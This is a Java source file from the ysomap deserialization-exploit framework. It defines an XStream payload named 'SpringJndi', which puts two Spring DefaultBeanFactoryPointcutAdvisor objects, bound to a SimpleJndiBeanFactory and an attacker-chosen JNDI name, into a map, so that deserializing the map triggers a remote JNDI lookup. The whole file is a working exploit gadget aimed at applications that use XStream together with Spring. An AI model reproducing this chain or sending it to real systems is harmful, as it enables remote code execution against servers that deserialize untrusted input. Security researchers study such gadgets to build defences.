package ysomap.core.payload.xstream;

import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
import org.springframework.jndi.support.SimpleJndiBeanFactory;
import ysomap.common.annotation.Authors;
import ysomap.common.annotation.Dependencies;
import ysomap.common.annotation.Payloads;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.bullet.spring.SpringJndiBullet1;
import ysomap.core.serializer.Serializer;
import ysomap.core.serializer.SerializerFactory;
import ysomap.core.util.PayloadHelper;

/**
 * @author wh1t3P1g
 * @since 2020/8/26
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.WH1T3P1G })
@Dependencies({"Gadget For XStream","spring-aop && spring-context"})
@Require(bullets = {"SpringJndiBullet1"}, param = false)
public class SpringJndi extends Payload<Object> {

    @Override
    public Bullet getDefaultBullet(String command) throws Exception {
        Bullet bullet = new SpringJndiBullet1();
        bullet.set("jndi",command);
        return bullet;
    }

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof SimpleJndiBeanFactory;
    }

    @Override
    public Serializer<?> getSerializer() {
        return SerializerFactory.createSerializer("xstream");
    }

    @Override
    public Object pack(Object obj) throws Exception {
        DefaultBeanFactoryPointcutAdvisor advisor1 = new DefaultBeanFactoryPointcutAdvisor();
        advisor1.setAdviceBeanName(bullet.get("jndi"));
        advisor1.setBeanFactory((SimpleJndiBeanFactory)obj);
        DefaultBeanFactoryPointcutAdvisor advisor2 = new DefaultBeanFactoryPointcutAdvisor();
        advisor2.setAdviceBeanName(bullet.get("jndi"));
        advisor2.setBeanFactory((SimpleJndiBeanFactory)obj);
//        advisor.setAdviceBeanName(bullet.get("jndi"));
//        advisor.setBeanFactory((SimpleJndiBeanFactory)obj);
        return PayloadHelper.makeMap(advisor1, advisor2);
    }
}
